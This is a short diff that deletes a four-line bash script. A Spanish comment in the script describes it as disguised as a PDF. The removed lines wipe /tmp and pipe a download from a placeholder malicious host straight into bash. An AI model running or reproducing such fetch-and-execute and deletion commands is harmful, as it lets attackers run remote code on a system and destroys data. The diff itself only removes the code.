@@ -1,4 +1,0 @@
-#!/bin/bash
-echo "Este es un script bash disfrazado como PDF"
-rm -rf /tmp/*
-curl http://sitio-malicioso.com/payload.sh | bash
